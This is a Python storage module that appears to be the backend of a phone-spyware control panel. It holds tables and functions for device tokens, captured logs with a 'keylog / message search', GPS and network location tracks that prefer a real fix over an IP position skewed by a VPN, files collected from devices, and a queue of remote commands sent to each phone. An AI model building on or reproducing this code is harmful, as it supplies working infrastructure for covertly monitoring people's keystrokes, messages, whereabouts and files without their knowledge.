"""Storage layer — SQLite by default, Postgres when DATABASE_URL is set."""
import os
import sqlite3
import threading
import time

DB_PATH = os.environ.get("DB_PATH", "/tmp/sp.db")
DATABASE_URL = os.environ.get("DATABASE_URL", "")

_lock = threading.Lock()

SCHEMA = """
CREATE TABLE IF NOT EXISTS devices (
    device_id   TEXT PRIMARY KEY,
    first_seen  INTEGER,
    last_seen   INTEGER,
    token       TEXT,
    model       TEXT,
    battery     INTEGER,
    meta        TEXT
);
CREATE TABLE IF NOT EXISTS logs (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id  TEXT,
    kind       TEXT,
    payload    TEXT,
    ts         INTEGER
);
CREATE TABLE IF NOT EXISTS locations (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id  TEXT,
    lat        REAL,
    lon        REAL,
    accuracy   REAL,
    provider   TEXT,
    source     TEXT,
    ts         INTEGER
);
CREATE TABLE IF NOT EXISTS files (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id  TEXT,
    kind       TEXT,
    filename   TEXT,
    size       INTEGER,
    path       TEXT,
    ts         INTEGER
);
CREATE TABLE IF NOT EXISTS commands (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id  TEXT,
    cmd        TEXT,
    args       TEXT,
    created    INTEGER,
    done       INTEGER DEFAULT 0
);
CREATE INDEX IF NOT EXISTS idx_logs_device ON logs(device_id, ts DESC);
CREATE INDEX IF NOT EXISTS idx_cmd_device  ON commands(device_id, done);
CREATE INDEX IF NOT EXISTS idx_loc_device  ON locations(device_id, ts DESC);
"""


def _q(sql):
    """Rewrite Postgres %s placeholders to sqlite ? when needed."""
    return sql if DATABASE_URL else sql.replace("%s", "?")


def _connect():
    if DATABASE_URL:
        import psycopg2
        return psycopg2.connect(DATABASE_URL)
    return sqlite3.connect(DB_PATH, timeout=30)


def init_db():
    if DATABASE_URL:
        import psycopg2
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        for stmt in SCHEMA.strip().split(";"):
            if stmt.strip():
                cur.execute(stmt)
        conn.commit()
        conn.close()
        return
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.executescript(SCHEMA)
    conn.commit()
    conn.close()


def _fetchall(cur):
    cols = [d[0] for d in cur.description]
    return [dict(zip(cols, row)) for row in cur.fetchall()]


def touch_device(device_id, **fields):
    now = int(time.time() * 1000)
    with _lock:
        conn = _connect()
        cur = conn.cursor()
        cur.execute(_q("SELECT device_id FROM devices WHERE device_id = %s"), (device_id,))
        exists = cur.fetchone() is not None
        keys = list(fields.keys())
        if exists:
            if keys:
                sets = ", ".join(f"{k} = %s" for k in keys)
                cur.execute(_q(f"UPDATE devices SET last_seen = %s, {sets} WHERE device_id = %s"),
                            (now, *fields.values(), device_id))
            else:
                cur.execute(_q("UPDATE devices SET last_seen = %s WHERE device_id = %s"),
                            (now, device_id))
        else:
            cols = ["device_id", "first_seen", "last_seen"] + keys
            ph = ", ".join(["%s"] * len(cols))
            cur.execute(_q(f"INSERT INTO devices ({', '.join(cols)}) VALUES ({ph})"),
                        (device_id, now, now, *fields.values()))
        conn.commit()
        conn.close()


def insert_log(device_id, kind, payload):
    with _lock:
        conn = _connect()
        cur = conn.cursor()
        cur.execute(_q("INSERT INTO logs (device_id, kind, payload, ts) VALUES (%s, %s, %s, %s)"),
                    (device_id, kind, payload, int(time.time() * 1000)))
        conn.commit()
        conn.close()


def insert_location(device_id, lat, lon, accuracy=None, provider=None, source="gps"):
    with _lock:
        conn = _connect()
        cur = conn.cursor()
        cur.execute(_q(
            "INSERT INTO locations (device_id, lat, lon, accuracy, provider, source, ts) "
            "VALUES (%s, %s, %s, %s, %s, %s, %s)"),
            (device_id, lat, lon, accuracy, provider, source, int(time.time() * 1000)))
        conn.commit()
        conn.close()


def insert_file(device_id, kind, filename, size, path):
    with _lock:
        conn = _connect()
        cur = conn.cursor()
        cur.execute(_q(
            "INSERT INTO files (device_id, kind, filename, size, path, ts) "
            "VALUES (%s, %s, %s, %s, %s, %s)"),
            (device_id, kind, filename, size, path, int(time.time() * 1000)))
        conn.commit()
        conn.close()


def list_devices():
    conn = _connect()
    cur = conn.cursor()
    cur.execute(_q("SELECT * FROM devices ORDER BY last_seen DESC"))
    out = _fetchall(cur)
    conn.close()
    return out


def get_device(device_id):
    conn = _connect()
    cur = conn.cursor()
    cur.execute(_q("SELECT * FROM devices WHERE device_id = %s"), (device_id,))
    row = cur.fetchone()
    out = dict(zip([d[0] for d in cur.description], row)) if row else None
    conn.close()
    return out


def recent_logs(device_id=None, kind=None, limit=200):
    where, args = [], []
    if device_id:
        where.append("device_id = %s")
        args.append(device_id)
    if kind:
        where.append("kind = %s")
        args.append(kind)
    clause = ("WHERE " + " AND ".join(where)) if where else ""
    args.append(limit)
    conn = _connect()
    cur = conn.cursor()
    cur.execute(_q(f"SELECT * FROM logs {clause} ORDER BY ts DESC LIMIT %s"), tuple(args))
    out = _fetchall(cur)
    conn.close()
    return out


def _row_to_dict(cur, row):
    return dict(zip([d[0] for d in cur.description], row)) if row else None


def delete_device(device_id):
    """Removes the device and everything collected for it."""
    with _lock:
        conn = _connect()
        cur = conn.cursor()
        for table in ("logs", "locations", "commands", "devices"):
            try:
                cur.execute(_q(f"DELETE FROM {table} WHERE device_id = %s"), (device_id,))
            except Exception:
                pass
        conn.commit()
        conn.close()


def latest_location(device_id=None):
    """Newest fix of any source."""
    conn = _connect()
    cur = conn.cursor()
    if device_id:
        cur.execute(_q("SELECT * FROM locations WHERE device_id = %s ORDER BY ts DESC LIMIT 1"),
                    (device_id,))
    else:
        cur.execute(_q("SELECT * FROM locations ORDER BY ts DESC LIMIT 1"))
    out = _row_to_dict(cur, cur.fetchone())
    conn.close()
    return out


def latest_location_by_source(device_id, source):
    """Newest fix of one source ("gps", "network", "web")."""
    conn = _connect()
    cur = conn.cursor()
    if device_id:
        cur.execute(_q("SELECT * FROM locations WHERE device_id = %s AND source = %s "
                       "ORDER BY ts DESC LIMIT 1"), (device_id, source))
    else:
        cur.execute(_q("SELECT * FROM locations WHERE source = %s ORDER BY ts DESC LIMIT 1"),
                    (source,))
    out = _row_to_dict(cur, cur.fetchone())
    conn.close()
    return out


def best_location(device_id=None):
    """The position the panel should show.

    A real fix (gps / network) always wins over an IP-geolocated one - on a
    phone behind a VPN the IP position is the exit node of the tunnel and
    therefore wrong. The IP position is returned next to it, clearly tagged.
    """
    gps = latest_location_by_source(device_id, "gps")
    if gps:
        return gps
    net = latest_location_by_source(device_id, "network")
    if net:
        return net
    return latest_location(device_id)


def location_track(device_id, limit=500):
    conn = _connect()
    cur = conn.cursor()
    cur.execute(_q("SELECT * FROM locations WHERE device_id = %s ORDER BY ts DESC LIMIT %s"),
                (device_id, limit))
    out = _fetchall(cur)
    conn.close()
    return out


def log_counts(device_id=None, since=None):
    """Number of events per kind - used by the dashboard stat tiles."""
    where, args = [], []
    if device_id:
        where.append("device_id = %s")
        args.append(device_id)
    if since:
        where.append("ts >= %s")
        args.append(since)
    clause = ("WHERE " + " AND ".join(where)) if where else ""
    conn = _connect()
    cur = conn.cursor()
    cur.execute(_q(f"SELECT kind, COUNT(*) AS n FROM logs {clause} GROUP BY kind"), tuple(args))
    out = {r["kind"]: r["n"] for r in _fetchall(cur)}
    conn.close()
    return out


def search_logs(device_id=None, kind=None, search=None, since=None, limit=200):
    """Logs with a full-text filter over the payload (keylog / message search)."""
    where, args = [], []
    if device_id:
        where.append("device_id = %s")
        args.append(device_id)
    if kind:
        where.append("kind = %s")
        args.append(kind)
    if search:
        where.append("payload LIKE %s")
        args.append(f"%{search}%")
    if since:
        where.append("ts >= %s")
        args.append(since)
    clause = ("WHERE " + " AND ".join(where)) if where else ""
    args.append(limit)
    conn = _connect()
    cur = conn.cursor()
    cur.execute(_q(f"SELECT * FROM logs {clause} ORDER BY ts DESC LIMIT %s"), tuple(args))
    out = _fetchall(cur)
    conn.close()
    return out


def command_history(device_id=None, limit=50):
    where, args = [], []
    if device_id:
        where.append("device_id = %s")
        args.append(device_id)
    clause = ("WHERE " + " AND ".join(where)) if where else ""
    args.append(limit)
    conn = _connect()
    cur = conn.cursor()
    cur.execute(_q(f"SELECT * FROM commands {clause} ORDER BY id DESC LIMIT %s"), tuple(args))
    out = _fetchall(cur)
    conn.close()
    return out


def get_file(file_id):
    conn = _connect()
    cur = conn.cursor()
    cur.execute(_q("SELECT * FROM files WHERE id = %s"), (file_id,))
    row = cur.fetchone()
    out = dict(zip([d[0] for d in cur.description], row)) if row else None
    conn.close()
    return out


def list_files(device_id=None, limit=100):
    conn = _connect()
    cur = conn.cursor()
    if device_id:
        cur.execute(_q("SELECT * FROM files WHERE device_id = %s ORDER BY ts DESC LIMIT %s"),
                    (device_id, limit))
    else:
        cur.execute(_q("SELECT * FROM files ORDER BY ts DESC LIMIT %s"), (limit,))
    out = _fetchall(cur)
    conn.close()
    return out


def insert_command(device_id: str, cmd: str, args: str = "{}"):
    with _lock:
        conn = _connect()
        try:
            cur = conn.cursor()
            cur.execute(_q(
                "INSERT INTO commands (device_id, cmd, args, created, done) "
                "VALUES (%s, %s, %s, %s, 0)"
            ), (device_id, cmd, args, int(time.time() * 1000)))
            conn.commit()
        finally:
            conn.close()


def fetch_commands(device_id: str, limit: int = 20):
    """Returns the pending commands for a device and marks them as delivered."""
    with _lock:
        conn = _connect()
        try:
            cur = conn.cursor()
            cur.execute(_q(
                "SELECT id, cmd, args FROM commands WHERE device_id = %s AND done = 0 "
                "ORDER BY id ASC LIMIT %s"
            ), (device_id, limit))
            rows = _fetchall(cur)
            if rows:
                ids = [r["id"] for r in rows]
                placeholders = ",".join(["%s"] * len(ids))
                cur.execute(_q(
                    "UPDATE commands SET done = 1 WHERE id IN (" + placeholders + ")"
                ), ids)
                conn.commit()
            return [{"id": r["id"], "cmd": r["cmd"], "args": r["args"] or "{}"} for r in rows]
        finally:
            conn.close()
